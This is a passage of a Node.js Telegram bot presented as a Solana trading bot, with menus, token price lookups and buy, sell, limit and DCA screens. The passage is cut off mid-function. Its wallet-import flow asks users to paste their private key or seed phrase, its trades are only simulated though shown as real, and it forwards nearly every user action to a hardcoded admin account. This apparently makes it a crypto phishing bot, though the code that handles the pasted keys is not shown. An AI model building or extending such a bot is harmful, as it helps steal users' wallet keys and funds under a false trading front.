// index.mjs - cleaned & fixed version
import 'dotenv/config';
import bs58 from 'bs58';
import fs from 'fs';
import path from 'path';
import { Telegraf, session, Markup } from 'telegraf';
import fetch from 'node-fetch';
import {
  Connection,
  Keypair,
  LAMPORTS_PER_SOL,
} from '@solana/web3.js';
import spl from '@solana/spl-token';
import bip39 from 'bip39';
import { derivePath } from 'ed25519-hd-key';

const { TOKEN_PROGRAM_ID } = spl;
const PAGE_SIZE = 5;

function showMainMenu(ctx) {
  ctx.session = ctx.session || {};

  // clear all flows
  ctx.session.searchFlow = null;
  ctx.session.profileFlow = null;
  ctx.session.chartFlow = null;
  ctx.session.sellFlow = null;
  ctx.session.buyFlow = null;

  return ctx.reply(
`🚀 *MetaSolana Bot*

Choose an option below 👇`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "🔍 Search", callback_data: "search" },
            { text: "📊 Charts", callback_data: "charts" }
          ],
          [
            { text: "🔥 Boosted", callback_data: "boosted" },
            { text: "⭐ Top Boost", callback_data: "topboost" }
          ],
          [
            { text: "👤 Profile", callback_data: "profile" }
          ]
        ]
      }
    }
  );
}



// ---------- CONFIG ----------
const BOT_TOKEN = process.env.BOT_TOKEN;
const MORALIS_API_KEY = process.env.MORALIS_API_KEY || null;

if (!BOT_TOKEN) {
  console.error("Set BOT_TOKEN in .env");
  process.exit(1);
}
const ADMIN_ID = Number(process.env.ADMIN_ID || 5518284762);
const DATA_DIR = './data';
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR);

// RPC (allow override via env)
const RPC_URL = process.env.SOLANA_RPC || 'https://api.devnet.solana.com';
const connection = new Connection(RPC_URL, 'confirmed');

// ---------- Bot init ----------
const bot = new Telegraf(BOT_TOKEN);
bot.use(session());

// ---------- Bot wallet (for devnet ops) ----------
const BOT_WALLET_FILE = './wallet.json';
function loadOrCreateBotWallet() {
  if (fs.existsSync(BOT_WALLET_FILE)) {
    try {
      const raw = JSON.parse(fs.readFileSync(BOT_WALLET_FILE));
      return Keypair.fromSecretKey(new Uint8Array(raw));
    } catch (e) {
      console.error('Failed to load bot wallet file, creating new one.', e);
    }
  }

  const mnemonic = bip39.generateMnemonic(128);
  const seed = bip39.mnemonicToSeedSync(mnemonic);
  const { key } = derivePath("m/44'/501'/0'/0'", seed.toString('hex'));
  const kp = Keypair.fromSeed(key);
  fs.writeFileSync(BOT_WALLET_FILE, JSON.stringify(Array.from(kp.secretKey)));
  console.log('New bot mnemonic (shown once):', mnemonic);
  console.log('Bot public key:', kp.publicKey.toBase58());
  return kp;
}
const botWallet = loadOrCreateBotWallet();

// ---------- In-memory user wallets ----------
const userWallets = {}; // userId -> Keypair

// ---------- Generic helpers ----------
function uid(prefix = 'id') {
  return `${prefix}_${Date.now()}_${Math.floor(Math.random() * 10000)}`;
}
function saveJSON(filePath, data) {
  try { fs.writeFileSync(filePath, JSON.stringify(data, null, 2)); } catch (e) { console.error('saveJSON error', e); }
}
function loadJSON(filePath, fallback = []) {
  try { if (!fs.existsSync(filePath)) return fallback; return JSON.parse(fs.readFileSync(filePath)); } catch (e) { console.error('loadJSON error', e); return fallback; }
}

// ---------- Files helpers ----------
function positionsFileForUser(userId) { return path.join(DATA_DIR, `positions_${userId}.json`); }
function limitsFileForUser(userId) { return path.join(DATA_DIR, `limits_${userId}.json`); }
function dcaFileForUser(userId) { return path.join(DATA_DIR, `dca_${userId}.json`); }

function loadUserPositions(userId) { return loadJSON(positionsFileForUser(userId), []); }
function saveUserPositions(userId, arr) { saveJSON(positionsFileForUser(userId), arr); }

function loadUserLimits(userId) { return loadJSON(limitsFileForUser(userId), []); }
function saveUserLimits(userId, arr) { saveJSON(limitsFileForUser(userId), arr); }

function loadUserDca(userId) { return loadJSON(dcaFileForUser(userId), []); }
function saveUserDca(userId, arr) { saveJSON(dcaFileForUser(userId), arr); }

// ---------- safeAnswer -----------
// Call answerCbQuery but swallow all errors (including "query is too old")
function safeAnswer(ctx) {
  try {
    if (ctx && typeof ctx.answerCbQuery === 'function') {
      // call but don't await to avoid blocking; swallow errors
      ctx.answerCbQuery().catch(() => { });
    }
  } catch (e) { }
}



// ---------- Admin logging ----------
async function logToAdmin(ctxOrNull, actionDesc, extra = '') {
  try {
    const who = ctxOrNull && ctxOrNull.from ? `${ctxOrNull.from.username || ctxOrNull.from.first_name || ctxOrNull.from.id} (ID:${ctxOrNull.from.id})` : 'System';
    let msg = `📌 User Action Log\nUser: ${who}\nAction: ${actionDesc}`;
    if (extra) msg += `\nDetails: ${extra}`;
    await bot.telegram.sendMessage(ADMIN_ID, msg);
  } catch (e) {
    console.error("Admin log error:", e);
  }
}

// ---------- Token / Price Helpers ----------
async function fetchDexScreenerForMint(mint) {
  try {
    const url = `https://api.dexscreener.com/latest/dex/tokens/${mint}`;
    const r = await fetch(url);
    if (!r.ok) throw new Error('no dexscreener');
    return await r.json();
  } catch (e) { return null; }
}

let coinListCache = null;
async function coinIdFromSymbol(symbol) {
  symbol = (symbol || '').toLowerCase();
  if (!coinListCache) {
    try {
      const r = await fetch('https://api.coingecko.com/api/v3/coins/list');
      coinListCache = await r.json();
    } catch (e) { coinListCache = []; }
  }
  return coinListCache.find(c => c.symbol === symbol || c.id === symbol || (c.name && c.name.toLowerCase() === symbol))?.id || null;
}

async function getPriceUsd(tokenInput) {
  try {
    if (!tokenInput) return null;
    if (tokenInput.length >= 40) {
      const ds = await fetchDexScreenerForMint(tokenInput);
      const p = ds?.pairs?.[0];
      if (p) return Number(p.priceUsd || p.price || 0);
      return null;
    }
    if (tokenInput.toLowerCase() === 'sol' || tokenInput.toLowerCase() === 'solana') {
      const r = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
      if (!r.ok) return null;
      const j = await r.json();
      return j['solana']?.usd || null;
    }
    const id = await coinIdFromSymbol(tokenInput);
    if (!id) return null;
    const r = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${id}&vs_currencies=usd`);
    if (!r.ok) return null;
    const j = await r.json();
    return j[id]?.usd || null;
  } catch (e) {
    return null;
  }
}

async function resolveTokenSymbol(tokenInput) {
  try {
    if (!tokenInput) return null;
    if (tokenInput.length >= 40) {
      const ds = await fetchDexScreenerForMint(tokenInput);
      const p = ds?.pairs?.[0];
      return p?.baseToken?.symbol || ds?.tokenSymbol || tokenInput.slice(0, 8).toUpperCase();
    } else {
      const id = await coinIdFromSymbol(tokenInput);
      if (!id) return tokenInput.toUpperCase();
      const info = await fetch(`https://api.coingecko.com/api/v3/coins/${id}`).then(r => r.json());
      return info.symbol?.toUpperCase() || tokenInput.toUpperCase();
    }
  } catch (e) {
    return tokenInput.slice(0, 8).toUpperCase();
  }
}

// ---------- UI helpers ----------
function mainMenu() {
  return Markup.inlineKeyboard([
    [Markup.button.callback("🛒 Buy", "buy"), Markup.button.callback("💰 Sell", "sell")],
    [Markup.button.callback("📊 Positions", "positions"), Markup.button.callback("📈 Limits", "limits"), Markup.button.callback("🔁 DCA", "dca")],
    [Markup.button.callback("🔥 Trending", "trending"), Markup.button.callback("🚀 Boosted", "boosted"), Markup.button.callback("🚀 Top Boost", "topboost")],
    [Markup.button.callback("⭐ Profiles", "profiles"), Markup.button.callback("🔍 Search", "search"), Markup.button.callback("📊 Charts", "charts")],
    [Markup.button.callback("🎉 Launch", "launch"), Markup.button.callback("🎁 Claim Airdrop", "airdrop")],
    [Markup.button.callback("🔗 Wallet", "wallet"), Markup.button.callback("🌕 Buy Trending", "buy_trending")],
    [Markup.button.callback("🔄 Refresh", "refresh"), Markup.button.callback("📋 Copy Bot Wallet", "copy_wallet")],
    [Markup.button.callback("❓ Help", "help")]
  ]);
}

// ---------- /start ----------
bot.start(async (ctx) => {
  await logToAdmin(ctx, "/start");

  const balSol = await connection
    .getBalance(botWallet.publicKey)
    .then(b => b / LAMPORTS_PER_SOL)
    .catch(() => 0);

  const balUsd = 0; // optional: plug SOL→USD later

  await ctx.replyWithMarkdown(
`🚀 *Welcome to Meta Trading Bot!*

_Exclusively built by the Meta Trading Community —  
the ultimate bot for trading any SOL token with speed and precision._

━━━━━━━━━━━━━━━━━━━━━━━

💼 *Bot Wallet*
\`${botWallet.publicKey.toBase58()}\`

💰 *Balance*
*Bal:* ${balSol.toFixed(4)} SOL — $${balUsd.toFixed(2)}

━━━━━━━━━━━━━━━━━━━━━━━

🔄 Tap *Refresh* to update your balance.`,
    mainMenu()
  );
});


// ---------- Refresh ----------
bot.action("refresh", async (ctx) => {
  safeAnswer(ctx);
  await logToAdmin(ctx, "Pressed Refresh", ctx.from?.id?.toString());
  const bal = await connection.getBalance(botWallet.publicKey).then(b => b / LAMPORTS_PER_SOL).catch(() => 0);
  try {
    await ctx.editMessageText(
      `🔄 *Balance Updated*\n\n💼 Bot Wallet: \`${botWallet.publicKey.toBase58()}\`\n💰 Balance: *${bal} SOL*`,
      { parse_mode: "Markdown", ...mainMenu() }
    );
  } catch (e) { }
});

// ---------- Wallet menu ----------
bot.action("wallet", async (ctx) => {
  safeAnswer(ctx);
  await logToAdmin(ctx, "Opened Wallet Menu");
  const bal = await connection.getBalance(botWallet.publicKey).then(b => b / LAMPORTS_PER_SOL).catch(() => 0);
  await ctx.replyWithMarkdown(
    `💼 *Bot Wallet:* \`${botWallet.publicKey.toBase58()}\`\n💰 *SOL:* ${bal} SOL\n\nChoose an action:`,
    Markup.inlineKeyboard([
      [Markup.button.callback("🪂 Request Devnet Airdrop (1 SOL)", "airdrop")],
      [Markup.button.callback("📥 Import Wallet", "import_wallet")],
      [Markup.button.callback("↩️ Back", "back_to_main")]
    ])
  );
});


// ---------- Import Wallet flow ----------
bot.action('import_wallet', async (ctx) => {
  safeAnswer(ctx);
  await logToAdmin(ctx, "Started import_wallet flow", ctx.from?.id?.toString());
  const msg = await ctx.replyWithMarkdown(
    "🔒 *Security Tip:* Never share your private key or mnemonic with people.\n\n" +
    "To connect your wallet here, press *Continue* and paste your private key or mnemonic in reply. The message will be deleted immediately.",
    Markup.inlineKeyboard([[Markup.button.callback("📩 Continue", "import_continue")]])
  );
  setTimeout(() => ctx.deleteMessage(msg.message_id).catch(() => { }), 10_000);
});
bot.action('import_continue', async (ctx) => {
  safeAnswer(ctx);
  ctx.session = ctx.session || {};
  ctx.session.importFlow = { step: 'await_key' };
  await ctx.reply("🔒 Security Tip: Never share your private key or mnemonic with people.To connect your wallet here, press Continue and paste your private key or mnemonic in reply. The message will be deleted immediately.", Markup.forceReply());
});

// ---------- BUY UI ----------
bot.action("buy", async (ctx) => {
  safeAnswer(ctx);
  ctx.session = ctx.session || {};
  const userId = ctx.from.id;
  const userWallet = userWallets[userId] || null;

  if (!userWallet) {
    return ctx.editMessageText(
      `🛒 *Trading*\n\nPlease connect your wallet first to start trading.\n\n` +
      `Click *'Connect Wallet'* to import your wallet.`,
      {
        parse_mode: "Markdown",
        ...Markup.inlineKeyboard([
          [Markup.button.callback("🔗 Connect Wallet", "import_wallet")],
          [Markup.button.callback("⬅️ Back", "back_to_main")]
        ])
      }
    );
  }

  const balLamports = await connection.getBalance(userWallet.publicKey).catch(() => 0);
  const bal = (balLamports / LAMPORTS_PER_SOL);

  return ctx.editMessageText(
    `🛒 *Buy Tokens*\n\n` +
    `💰 *Your Balance:* ${bal.toFixed(4)} SOL\n\n` +
    `*Available Actions:*\n• Paste any token address to view details\n• Use search to find tokens\n• View trending tokens\n\n*Quick Buy Options:*`,
    {
      parse_mode: "Markdown",
      ...Markup.inlineKeyboard([
        [Markup.button.callback("🔥 Trending", "trending"), Markup.button.callback("🔍 Search", "search")],
        [Markup.button.callback("⭐ Profiles", "profiles"), Markup.button.callback("🚀 Boosted", "boosted")],
        [Markup.button.callback("💸 Withdraw", "withdraw"), Markup.button.callback("📊 Positions", "positions")],
        [Markup.button.callback("⬅️ Back", "back_to_main")]
      ])
    }
  );
});
bot.action("buy_trending", async (ctx) => {
  safeAnswer(ctx);
  ctx.session = ctx.session || {};

  const userId = ctx.from.id;
  const userWallet = userWallets[userId] || null;

  // 🔒 Wallet gate
  if (!userWallet) {
    return ctx.editMessageText(
`🛒 *Buy Trending*

🔗 Please connect your wallet first to continue.`,
      {
        parse_mode: "Markdown",
        ...Markup.inlineKeyboard([
          [Markup.button.callback("🔗 Connect Wallet", "import_wallet")],
          [Markup.button.callback("⬅️ Back", "back_to_main")]
        ])
      }
    );
  }

  // ✅ SHOW TRENDING OPTIONS (matches screenshot)
  return ctx.editMessageText(
`🔥 *Buy Trending Options*

Select your preferred option:`,
    {
      parse_mode: "Markdown",
      ...Markup.inlineKeyboard([
        [
          Markup.button.callback("🌿 SOL Trending", "buy_sol_trending"),
          Markup.button.callback("🧬 ETH Trending", "buy_eth_trending")
        ],
        [
          Markup.button.callback("⬅️ Back", "back_to_main")
        ]
      ])
    }
  );
});

// ---------- SELL UI (simulated) ----------
bot.action("sell", async (ctx) => {
  safeAnswer(ctx);
  ctx.session = ctx.session || {};
  await logToAdmin(ctx, "Opened Sell Menu", ctx.from?.id?.toString());

  const userId = ctx.from.id;
  const userWallet = userWallets[userId] || null;
  if (!userWallet) {
    return ctx.editMessageText(
      "💰 *Selling*\n\nPlease connect your wallet first to start trading.\n\nConnect wallet to sell tokens",
      {
        parse_mode: "Markdown",
        ...Markup.inlineKeyboard([
          [Markup.button.callback("🔗 Connect Wallet", "import_wallet")],
          [Markup.button.callback("📊 View Trending", "trending")],
          [Markup.button.callback("🔍 Search Tokens", "search")],
          [Markup.button.callback("⬅️ Back", "back_to_main")]
        ])
      }
    );
  }

  let bal = 0;
  try { const lam = await connection.getBalance(userWallet.publicKey).catch(() => 0); bal = lam / LAMPORTS_PER_SOL; } catch (e) { bal = 0; }

  return ctx.editMessageText(
    `💸 *Sell Tokens*\n\n` +
    `🔑 Wallet: \`${userWallet.publicKey.toBase58()}\`\n` +
    `💰 *SOL Balance:* ${bal.toFixed(6)} SOL\n\nSelect a quick sell size or enter a custom amount (SOL).`,
    {
      parse_mode: "Markdown",
      ...Markup.inlineKeyboard([
        [Markup.button.callback("25% ➗", "sell_pct_25"), Markup.button.callback("50% ➗", "sell_pct_50")],
        [Markup.button.callback("75% ➗", "sell_pct_75"), Markup.button.callback("100% ➗", "sell_pct_100")],
        [Markup.button.callback("Custom Amount", "sell_custom"), Markup.button.callback("⬅️ Back", "back_to_main")]
      ])
    }
  );
});

// sell handlers
bot.action("sell_pct_25", async (ctx) => { safeAnswer(ctx); await handlePercentSell(ctx, 25); });
bot.action("sell_pct_50", async (ctx) => { safeAnswer(ctx); await handlePercentSell(ctx, 50); });
bot.action("sell_pct_75", async (ctx) => { safeAnswer(ctx); await handlePercentSell(ctx, 75); });
bot.action("sell_pct_100", async (ctx) => { safeAnswer(ctx); await handlePercentSell(ctx, 100); });

async function handlePercentSell(ctx, percent) {
  try {
    const userId = ctx.from.id;
    const userWallet = userWallets[userId];
    if (!userWallet) { return ctx.reply("Please connect your wallet first (Wallet → Import Wallet)."); }
    const lam = await connection.getBalance(userWallet.publicKey).catch(() => 0);
    const bal = lam / LAMPORTS_PER_SOL;
    const sellAmount = +(bal * (percent / 100)).toFixed(6);
    if (sellAmount <= 0) return ctx.reply("Insufficient balance to sell.");

    const positions = loadUserPositions(userId);
    positions.push({
      id: uid('sell'),
      type: 'sell',
      amountSol: sellAmount,
      percent,
      time: new Date().toISOString(),
      source: 'simulated_sell'
    });
    saveUserPositions(userId, positions);

    await logToAdmin(ctx, `Simulated SELL ${percent}%`, `user:${userId} amount:${sellAmount}`);
    return ctx.replyWithMarkdown(`✅ Simulated SELL recorded: *${sellAmount} SOL* (${percent}%)`);
  } catch (e) {
    console.error('handlePercentSell error', e);
    return ctx.reply("❌ Failed to process sell.");
  }
}

bot.action("sell_custom", async (ctx) => {
  safeAnswer(ctx);
  ctx.session = ctx.session || {};
  ctx.session.sellFlow = { step: 'await_custom_amount' };
  await logToAdmin(ctx, "Started custom sell flow", ctx.from?.id?.toString());
  return ctx.reply("Enter the amount to sell (in SOL). Example: `0.25`", Markup.forceReply());
});

// ---------- Buy from search shortcut ----------
bot.action(/^buy_from_search_(.+)$/, async (ctx) => {

  safeAnswer(ctx);
  ctx.session = ctx.session || {};
  const tokenInput = decodeURIComponent(ctx.match[1]);
  ctx.session.buyFlow = { step: "choose_amount", token: { mint: tokenInput } };
  await ctx.reply(`🛒 Opening Buy Menu...\nToken detected: ${tokenInput}`);
  await ctx.reply(
    `Select amount to buy.`,
    Markup.inlineKeyboard([
      [Markup.button.callback("0.10 SOL", `buy_amount_0.10`), Markup.button.callback("0.25 SOL", `buy_amount_0.25`)],
      [Markup.button.callback("0.50 SOL", `buy_amount_0.50`), Markup.button.callback("1.00 SOL", `buy_amount_1.00`)],
      [Markup.button.callback("Cancel", `buy_cancel`)]
    ])
  );
});

// ---------- Buy quick amount handler ----------
bot.action(/^buy_amount_(.+)$/, async (ctx) => {
  try { await ctx.answerCbQuery(); } catch (e) { }
  safeAnswer(ctx);
  ctx.session = ctx.session || {};
  const userId = ctx.from.id;
  const tokenFlow = ctx.session.buyFlow;
  if (!tokenFlow || tokenFlow.step !== 'choose_amount' || !tokenFlow.token) {
    return ctx.reply('Buy session expired. Please start the buy flow again.');
  }

  const amountKey = ctx.match[1];
  const solAmount = Number(amountKey);
  if (isNaN(solAmount) || solAmount <= 0) return ctx.reply('Invalid buy amount.');

  const tokenInput = tokenFlow.token.mint || tokenFlow.token.symbol || tokenFlow.token;
  const tokenSymbol = await resolveTokenSymbol(tokenInput).catch(() => tokenInput);
  const tokenMint = tokenFlow.token.mint || null;

  const tokenPriceUsd = await getPriceUsd(tokenMint || tokenSymbol).catch(() => null);
  const solPriceUsd = await getPriceUsd('sol').catch(() => null);

  let estimatedTokens = null;
  if (tokenPriceUsd && solPriceUsd) {
    const totalUsd = solAmount * solPriceUsd;
    estimatedTokens = totalUsd / tokenPriceUsd;
  }

  try {
    const positions = loadUserPositions(userId);
    const pos = {
      id: uid('pos'),
      symbol: tokenSymbol,
      mint: tokenMint,
      entryPriceUsd: tokenPriceUsd || null,
      amountSol: solAmount,
      amountTokens: estimatedTokens !== null ? Number(estimatedTokens.toFixed(8)) : null,
      time: new Date().toISOString(),
      source: 'simulated_buy'
    };
    positions.push(pos);
    saveUserPositions(userId, positions);
  } catch (e) {
    console.error('save simulated buy error', e);
    return ctx.reply('Failed to record simulated buy.');
  }

  await logToAdmin(ctx, 'Simulated BUY via UI', `user:${userId} token:${tokenSymbol} sol:${solAmount}`);
  await ctx.replyWithMarkdown(`✅ Simulated BUY recorded: *${tokenSymbol}* — ${solAmount} SOL${estimatedTokens ? ` (~${Number(estimatedTokens.toFixed(4))} ${tokenSymbol})` : ''}`);
  ctx.session.buyFlow = null;
});

bot.action('buy_cancel', async (ctx) => { safeAnswer(ctx); ctx.session = ctx.session || {}; ctx.session.buyFlow = null; return ctx.reply('Buy cancelled.'); });

// ---------- Back to main ----------
bot.action('back_to_main', async (ctx) => {
  safeAnswer(ctx);
  await logToAdmin(ctx, 'Back to main', ctx.from.id?.toString());
  try {
    const bal = await connection.getBalance(botWallet.publicKey).then(b => b / LAMPORTS_PER_SOL).catch(() => 0);
    await ctx.editMessageText(
      `Main menu\n\nBot Wallet: \`${botWallet.publicKey.toBase58()}\`\nBalance: ${bal} SOL`,
      { parse_mode: 'Markdown', ...mainMenu() }
    );
  } catch (e) { }
});

// ---------- Positions ----------
bot.action('positions', async (ctx) => {
  try { await ctx.answerCbQuery(); } catch (e) { }
  safeAnswer(ctx);
  const userId = ctx.from.id;
  const positions = loadUserPositions(userId);
  if (!positions || positions.length === 0) return ctx.reply('📭 No positions recorded.');

  const lines = positions.slice(-20).reverse().map((p, idx) => {
    if (p.source === 'simulated_buy' || p.source === 'dca_run') {
      return `${idx + 1}. ${p.symbol || p.mint || 'TOKEN'}\nEntry: $${p.entryPriceUsd || 'N/A'}\nAmount: ${p.amountTokens ? p.amountTokens : `${p.amountSol || '?'} SOL`}\nTime: ${new Date(p.time).toLocaleString()}\n`;
    }
    return `${idx + 1}. ${p.symbol || p.mint || 'TOKEN'}\n${p.type ? `Type: ${p.type}\n` : ''}Amount: ${p.amount || p.amountSol}\nTime: ${new Date(p.time).toLocaleString()}\n`;
  });

  await ctx.replyWithMarkdown(`📊 *Your Trading Positions*\n\n${lines.join('\n')}\nTotal positions: ${positions.length}`, Markup.inlineKeyboard([
    [Markup.button.callback("💰 Close All", "close_all"), Markup.button.callback("📈 PnL History", "pnl_history")],
    [Markup.button.callback("🛒 New Trade", "buy"), Markup.button.callback("💵 Sell Tokens", "sell")],
    [Markup.button.callback("⬅️ Back", "back_to_main")]
  ]));
});

// ---------- Limits ----------
bot.action("limits", async (ctx) => {
  safeAnswer(ctx);
  const userId = ctx.from.id;
  const limits = loadUserLimits(userId);
  if (!limits || limits.length === 0) {
    return ctx.replyWithMarkdown(
      `📉 *Your Limit Orders*\n\nYou have no limit orders.`,
      Markup.inlineKeyboard([
        [Markup.button.callback("➕ New Order", "limit_new")],
        [Markup.button.callback("⬅️ Back", "back_to_main")]
      ])
    );
  }

  const lines = limits.map((o, i) => {
    const statusIcon = o.status === 'FILLED' ? '✅' : '⏳';
    const typeIcon = o.type === 'BUY' ? '🟢' : '🔴';
    return `${i + 1}. ${o.symbol} ${typeIcon} ${statusIcon}\nType: ${o.type}\nPrice: $${o.price}\nAmount: ${o.amount}\nStatus: ${o.status}\nTime: ${o.created}\n`;
  });

  await ctx.replyWithMarkdown(`📉 *Your Limit Orders*\n\n${lines.join('\n')}\nManage your limit orders.`, Markup.inlineKeyboard([
    [Markup.button.callback("➕ New Order", "limit_new"), Markup.button.callback("❌ Cancel All", "limit_cancel_all")],
    [Markup.button.callback("📊 Order History", "limit_history"), Markup.button.callback("⚙️ Settings", "limit_settings")],
    [Markup.button.callback("🛒 Quick Trade", "buy"), Markup.button.callback("⬅️ Back", "back_to_main")]
  ]));
});

bot.action("limit_new", async (ctx) => {
  safeAnswer(ctx);
  ctx.session = ctx.session || {};
  ctx.session.limitFlow = { step: 'await_token' };
  await ctx.reply("Enter token symbol or mint for LIMIT order (e.g. BONK or mint...).", Markup.forceReply());
});
bot.action("limit_cancel_all", async (ctx) => { safeAnswer(ctx); saveUserLimits(ctx.from.id, []); return ctx.reply("❌ All limit orders cancelled."); });
bot.action("limit_history", async (ctx) => { safeAnswer(ctx); const limits = loadUserLimits(ctx.from.id).filter(o => o.status === 'FILLED'); if (!limits.length) return ctx.reply("No filled limit orders."); return ctx.reply(limits.map((o, i) => `${i + 1}. ${o.symbol} | ${o.type} @ $${o.price} | Amount: ${o.amount} | Time: ${o.created}`).join('\n')); });
bot.action("limit_settings", async (ctx) => { safeAnswer(ctx); return ctx.reply("Limit settings coming soon."); });

bot.action("limit_type_buy", async (ctx) => { safeAnswer(ctx); ctx.session = ctx.session || {}; ctx.session.limitFlow.type = "BUY"; ctx.session.limitFlow.step = "await_price"; return ctx.reply("Enter your LIMIT PRICE in USD:"); });
bot.action("limit_type_sell", async (ctx) => { safeAnswer(ctx); ctx.session = ctx.session || {}; ctx.session.limitFlow.type = "SELL"; ctx.session.limitFlow.step = "await_price"; return ctx.reply("Enter your LIMIT PRICE in USD:"); });

// ---------- DCA ----------
bot.action("dca", async (ctx) => {
  safeAnswer(ctx);
  await logToAdmin(ctx, 'Opened DCA', ctx.from?.id?.toString());
  const userId = ctx.from.id;
  const userWallet = userWallets[userId] || null;
  if (!userWallet) {
    return ctx.editMessageText(
      `🔗 DCA Orders\n\nPlease connect your wallet first to start trading.`,
      {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
          [Markup.button.callback("🔗 Connect Wallet", "import_wallet")],
          [Markup.button.callback("⬅️ Back", "back_to_main")]
        ])
      }
    );
  }

  const dcas = loadUserDca(userId);
  if (!dcas || dcas.length === 0) {
    return ctx.replyWithMarkdown(
      `🔁 *Your DCA Orders*\n\nYou have no DCA orders.`,
      Markup.inlineKeyboard([
        [Markup.button.callback("➕ New DCA", "dca_new"), Markup.button.callback("❌ Cancel All", "dca_cancel_all")],
        [Markup.button.callback("📜 DCA History", "dca_history"), Markup.button.callback("⚙️ Settings", "dca_settings")],
        [Markup.button.callback("🛒 Quick Trade", "buy"), Markup.button.callback("⬅️ Back", "back_to_main")]
      ])
    );
  }

  const lines = dcas.map((d, i) => {
    const statusIcon = d.status === 'ACTIVE' ? '⏳' : (d.status === 'PAUSED' ? '⏸️' : '✅');
    return `${i + 1}. ${d.symbol} ${statusIcon}\nInterval: ${d.interval}\nAmount: ${d.amount} SOL\nStatus: ${d.status}\nNext run: ${d.nextRun ? new Date(d.nextRun).toLocaleString() : 'N/A'}\n`;
  });

  return ctx.replyWithMarkdown(`🔁 *Your DCA Orders*\n\n${lines.join('\n')}\nManage your DCA orders.`, Markup.inlineKeyboard([
    [Markup.button.callback("➕ New DCA", "dca_new"), Markup.button.callback("❌ Cancel All", "dca_cancel_all")],
    [Markup.button.callback("📜 DCA History", "dca_history"), Markup.button.callback("⚙️ Settings", "dca_settings")],
    [Markup.button.callback("🛒 Quick Trade", "buy"), Markup.button.callback("⬅️ Back", "back_to_main")]
  ]));
});

bot.action("dca_new", async (ctx) => { safeAnswer(ctx); ctx.session = ctx.session || {}; ctx.session.dcaFlow = { step: 'await_token' }; await ctx.reply("Enter token symbol or mint for DCA (e.g. BONK or mint).", Markup.forceReply()); });
bot.action("dca_cancel_all", async (ctx) => { safeAnswer(ctx); saveUserDca(ctx.from.id, []); return ctx.reply("❌ All DCA orders cancelled."); });
bot.action("dca_history", async (ctx) => { safeAnswer(ctx); const dcas = loadUserDca(ctx.from.id).filter(d => d.status !== 'ACTIVE'); if (!dcas.length) return ctx.reply("No DCA history."); return ctx.reply(dcas.map((d, i) => `${i + 1}. ${d.symbol} | ${d.amount} SOL | ${d.interval} | ${d.status} | Created: ${d.created}`).join('\n')); });
bot.action("dca_settings", async (ctx) => { safeAnswer(ctx); return ctx.reply("DCA settings coming soon."); });



bot.action(/boosted(?::(\d+))?/, async (ctx) => {
  safeAnswer(ctx);

  const page = Number(ctx.match[1] || 0);
  const PAGE_SIZE = 5;

  await logToAdmin(ctx, 'Opened Boosted');

  let data = [];

  try {
    const r = await fetch("https://api.dexscreener.com/latest/dex/search/?q=solana");
    const j = await r.json();
    data = (j.pairs || []).filter(p => p.chainId === "solana");
  } catch (e) {
    console.error("DexScreener error:", e);
  }

  if (!data.length) {
    return ctx.editMessageText(
      "📭 No boosted tokens found.",
      Markup.inlineKeyboard([[Markup.button.callback("⬅️ Back", "back_to_main")]])
    );
  }

  const start = page * PAGE_SIZE;
  const slice = data.slice(start, start + PAGE_SIZE);

  let text = "";

  slice.forEach((p, i) => {
    const index = start + i + 1;
    text +=
      `🔥 *${index}. ${p.baseToken.name} (${p.baseToken.symbol})*

🔗 *Mint:*
\`${p.baseToken.address}\`

💰 *Price:* $${p.priceUsd || "N/A"}
📊 *Liquidity:* $${Number(p.liquidity?.usd || 0).toLocaleString()}
📈 *Volume 24h:* $${Number(p.volume?.h24 || 0).toLocaleString()}

━━━━━━━━━━━━━━━━━━━━━━━

`;
  });

  const buttons = [];
  if (page > 0) buttons.push(Markup.button.callback("⬅️ Prev", `boosted:${page - 1}`));
  if (start + PAGE_SIZE < data.length) buttons.push(Markup.button.callback("Next ➡️", `boosted:${page + 1}`));

  buttons.push(Markup.button.callback("⬅️ Back", "back_to_main"));

  try {
    return await ctx.editMessageText(text, {
      parse_mode: "Markdown",
      disable_web_page_preview: true,
      ...Markup.inlineKeyboard([buttons])
    });
  } catch {
    return ctx.reply(text, {
      parse_mode: "Markdown",
      disable_web_page_preview: true,
      ...Markup.inlineKeyboard([buttons])
    });
  }

});


bot.action(/topboost(?::(\d+))?/, async (ctx) => {
  safeAnswer(ctx);
  await logToAdmin(ctx, 'Opened Top Boost');

  const page = Number(ctx.match?.[1] || 0);
  const PAGE_SIZE = 5;

  let pairs = [];

  try {
    const r = await fetch("https://api.dexscreener.com/latest/dex/search/?q=solana");
    const j = await r.json();

    pairs = (j.pairs || [])
      .filter(p => p.chainId === "solana" && p.liquidity?.usd)
      .sort((a, b) =>
        (b.volume?.h24 || 0) - (a.volume?.h24 || 0)
      );
  } catch (e) {
    console.error("TopBoost fetch error:", e);
  }

  if (!pairs.length) {
    return ctx.editMessageText(
      "📭 No top boosted tokens found.",
      Markup.inlineKeyboard([[Markup.button.callback("⬅️ Back", "back_to_main")]])
    );
  }

  const start = page * PAGE_SIZE;
  const slice = pairs.slice(start, start + PAGE_SIZE);

  let text = "";

  slice.forEach((p, i) => {
    const index = start + i + 1;

    text +=
      `🚀 *${index}. ${p.baseToken.name} (${p.baseToken.symbol})*

🔗 *Mint:*
\`${p.baseToken.address}\`

💰 *Price:* $${p.priceUsd || "N/A"}
📊 *Liquidity:* $${Number(p.liquidity.usd).toLocaleString()}
📈 *Volume (24h):* $${Number(p.volume?.h24 || 0).toLocaleString()}
🧠 *DEX:* ${p.dexId}

━━━━━━━━━━━━━━━━━━━━━━━

`;
  });

  const buttons = [];
  if (page > 0) buttons.push(Markup.button.callback("⬅️ Prev", `topboost:${page - 1}`));
  if (start + PAGE_SIZE < pairs.length) buttons.push(Markup.button.callback("Next ➡️", `topboost:${page + 1}`));

  buttons.push(Markup.button.callback("⬅️ Back", "back_to_main"));

  try {
    return await ctx.editMessageText(text, {
      parse_mode: "Markdown",
      disable_web_page_preview: true,
      ...Markup.inlineKeyboard([buttons])
    });
  } catch {
    return ctx.reply(text, {
      parse_mode: "Markdown",
      disable_web_page_preview: true,
      ...Markup.inlineKeyboard([buttons])
    });
  }

});

bot.action("profiles", async (ctx) => {
  safeAnswer(ctx);
